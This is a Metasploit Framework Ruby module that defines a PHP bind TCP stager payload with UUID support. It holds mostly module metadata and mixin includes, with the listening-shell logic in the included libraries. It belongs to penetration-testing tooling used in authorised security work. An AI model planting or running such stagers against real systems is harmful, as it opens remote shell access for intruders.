##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/php/bind_tcp'

module Metasploit4

  CachedSize = 1357

  include Msf::Payload::Stager
  include Msf::Payload::Php::BindTcp

  def self.handler_type_alias
    "bind_tcp_uuid"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager with UUID support',
      'Description' => 'Listen for a connection with UUID support',
      'Author'      => ['egypt'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'php',
      'Arch'        => ARCH_PHP,
      'Handler'     => Msf::Handler::BindTcp,
      'Stager'      => { 'Payload' => "" }
      ))
  end

  def include_send_uuid
    true
  end

end
